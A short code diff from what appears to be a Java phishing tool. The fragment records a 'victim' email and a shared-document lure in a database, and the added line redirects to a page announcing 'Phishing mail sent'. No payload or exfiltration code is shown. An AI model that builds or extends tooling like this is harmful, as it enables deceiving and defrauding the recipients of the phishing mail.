@@ -87,6 +87,7 @@
 
                 //Adding data to db
                 Orders.getInstance().add(new Order(null, key, victimEmail, userEmail, sharedBy, docTitle, docUrl, content, false));
+                response.sendRedirect("status.jsp?title=Done&message=Phishing mail sent");
             }
 
         } catch (MailException | SQLException e) {
